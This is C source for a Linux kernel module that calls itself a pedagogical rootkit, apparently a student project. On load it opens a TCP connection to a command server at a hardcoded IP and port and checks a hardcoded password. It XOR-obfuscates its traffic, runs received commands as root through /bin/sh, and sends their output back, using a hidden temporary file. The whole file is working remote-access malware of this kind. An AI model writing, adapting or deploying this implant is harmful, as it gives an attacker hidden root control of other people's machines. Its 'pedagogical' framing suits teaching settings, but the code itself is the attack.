#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.1");

/* Configuration constants */
#define ROOTKIT_CONFIG_PORT 4242
#define ROOTKIT_CONFIG_SERVER_IP "10.0.2.2"
#define ROOTKIT_CONFIG_BUFFER_SIZE 1024
#define ROOTKIT_CONFIG_XOR_KEY "epirootkit"
#define ROOTKIT_CONFIG_PASSWORD "epita"
#define ROOTKIT_CONFIG_TEMP_OUTPUT_FILE "/tmp/.rk_out"
#define ROOTKIT_CONFIG_COMMAND_PREFIX_AUTH "auth "
#define ROOTKIT_CONFIG_COMMAND_PREFIX_EXEC "exec "
#define ROOTKIT_CONFIG_COMMAND_PREFIX_LENGTH 5
#define ROOTKIT_CONFIG_SHELL_PATH "/bin/sh"
#define ROOTKIT_CONFIG_SHELL_ARGS "-c"
#define ROOTKIT_CONFIG_PATH_ENV "PATH=/usr/bin:/bin"

/* Global state */
static struct socket *g_connection_socket = NULL;
static struct task_struct *g_rootkit_thread = NULL;
static bool g_is_authenticated = false;

/* Forward declarations */
static int rootkit_thread(void *data);
static int connect_to_server(void);
static void exec_and_send_output(const char *cmd);
static int send_data(const char *msg);

/**
 * @brief Applies XOR cipher to a buffer using the configured key
 * @param buffer Buffer to encrypt/decrypt
 * @param length Length of the buffer
 */
static void apply_xor_cipher(char *buffer, int length) {
    const size_t key_length = strlen(ROOTKIT_CONFIG_XOR_KEY);
    for (int i = 0; i < length; i++) {
        buffer[i] ^= ROOTKIT_CONFIG_XOR_KEY[i % key_length];
    }
}

/**
 * @brief Sends encrypted data to the server
 * @param message Message to send
 * @return Number of bytes sent or negative error code
 */
static int send_data(const char *message) {
    struct kvec iov;
    struct msghdr msg_header = { .msg_flags = MSG_NOSIGNAL };
    int message_length = strlen(message);
    char *encrypted_message;

    encrypted_message = kmalloc(message_length, GFP_KERNEL);
    if (!encrypted_message)
        return -ENOMEM;

    memcpy(encrypted_message, message, message_length);
    apply_xor_cipher(encrypted_message, message_length);

    iov.iov_base = encrypted_message;
    iov.iov_len = message_length;

    int result = kernel_sendmsg(g_connection_socket, &msg_header, &iov, 1, message_length);
    kfree(encrypted_message);
    return result;
}

/**
 * @brief Executes a command and sends its output to the server
 * @param command Command to execute
 */
static void exec_and_send_output(const char *command) {
    struct file *output_file;
    mm_segment_t old_fs;
    char *output_buffer;
    int read_result;
    char full_command[256];

    /* Prepare command string */
    snprintf(full_command, sizeof(full_command), "sh -c '%s' 2>&1", command);

    /* Execute command and capture output */
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    output_file = filp_open(ROOTKIT_CONFIG_TEMP_OUTPUT_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (!IS_ERR(output_file)) {
        static char *argv[] = { ROOTKIT_CONFIG_SHELL_PATH, ROOTKIT_CONFIG_SHELL_ARGS, full_command, NULL };
        static char *envp[] = { ROOTKIT_CONFIG_PATH_ENV, NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        filp_close(output_file, NULL);
    }
    set_fs(old_fs);

    /* Read command output */
    output_file = filp_open(ROOTKIT_CONFIG_TEMP_OUTPUT_FILE, O_RDONLY, 0);
    if (IS_ERR(output_file))
        return;

    output_buffer = kmalloc(ROOTKIT_CONFIG_BUFFER_SIZE, GFP_KERNEL);
    if (!output_buffer) {
        filp_close(output_file, NULL);
        return;
    }

    memset(output_buffer, 0, ROOTKIT_CONFIG_BUFFER_SIZE);
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    read_result = kernel_read(output_file, output_buffer, ROOTKIT_CONFIG_BUFFER_SIZE - 1, &output_file->f_pos);
    set_fs(old_fs);
    filp_close(output_file, NULL);

    if (read_result > 0) {
        output_buffer[read_result] = '\0';
        send_data(output_buffer);
    }

    kfree(output_buffer);
}

/**
 * @brief Main rootkit thread handling communication with the server
 * @param data Unused parameter
 * @return 0 on success
 */
static int rootkit_thread(void *data) {
    char *receive_buffer = kmalloc(ROOTKIT_CONFIG_BUFFER_SIZE, GFP_KERNEL);
    struct kvec iov;
    struct msghdr msg_header = { .msg_flags = 0 };

    if (!receive_buffer)
        return -ENOMEM;

    while (!kthread_should_stop()) {
        memset(receive_buffer, 0, ROOTKIT_CONFIG_BUFFER_SIZE);
        iov.iov_base = receive_buffer;
        iov.iov_len = ROOTKIT_CONFIG_BUFFER_SIZE;

        int received_length = kernel_recvmsg(g_connection_socket, &msg_header, &iov, 1, ROOTKIT_CONFIG_BUFFER_SIZE, 0);
        if (received_length <= 0)
            break;

        apply_xor_cipher(receive_buffer, received_length);
        receive_buffer[received_length] = '\0';

        if (!g_is_authenticated) {
            if (strncmp(receive_buffer, ROOTKIT_CONFIG_COMMAND_PREFIX_AUTH, ROOTKIT_CONFIG_COMMAND_PREFIX_LENGTH) == 0) {
                if (strncmp(receive_buffer + ROOTKIT_CONFIG_COMMAND_PREFIX_LENGTH, 
                           ROOTKIT_CONFIG_PASSWORD, 
                           strlen(ROOTKIT_CONFIG_PASSWORD)) == 0) {
                    g_is_authenticated = true;
                    send_data("OK\n");
                } else {
                    send_data("FAIL\n");
                }
            }
        } else {
            if (strncmp(receive_buffer, ROOTKIT_CONFIG_COMMAND_PREFIX_EXEC, ROOTKIT_CONFIG_COMMAND_PREFIX_LENGTH) == 0) {
                exec_and_send_output(receive_buffer + ROOTKIT_CONFIG_COMMAND_PREFIX_LENGTH);
            } else {
                send_data("Commande inconnue\n");
            }
        }

        msleep(100);
    }

    kfree(receive_buffer);
    return 0;
}

/**
 * @brief Establishes connection to the command server
 * @return 0 on success, negative error code on failure
 */
static int connect_to_server(void) {
    struct sockaddr_in server_address;
    int result;

    result = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_connection_socket);
    if (result < 0)
        return result;

    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(ROOTKIT_CONFIG_PORT);
    server_address.sin_addr.s_addr = in_aton(ROOTKIT_CONFIG_SERVER_IP);

    return g_connection_socket->ops->connect(g_connection_socket, 
                                          (struct sockaddr *)&server_address, 
                                          sizeof(server_address), 
                                          0);
}

/**
 * @brief Module initialization function
 * @return 0 on success, negative error code on failure
 */
static int __init rootkit_init(void) {
    int result = connect_to_server();
    if (result < 0)
        return result;

    g_rootkit_thread = kthread_run(rootkit_thread, NULL, "rk_thread");
    if (IS_ERR(g_rootkit_thread))
        return PTR_ERR(g_rootkit_thread);

    return 0;
}

/**
 * @brief Module cleanup function
 */
static void __exit rootkit_exit(void) {
    if (g_rootkit_thread)
        kthread_stop(g_rootkit_thread);
    if (g_connection_socket)
        sock_release(g_connection_socket);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
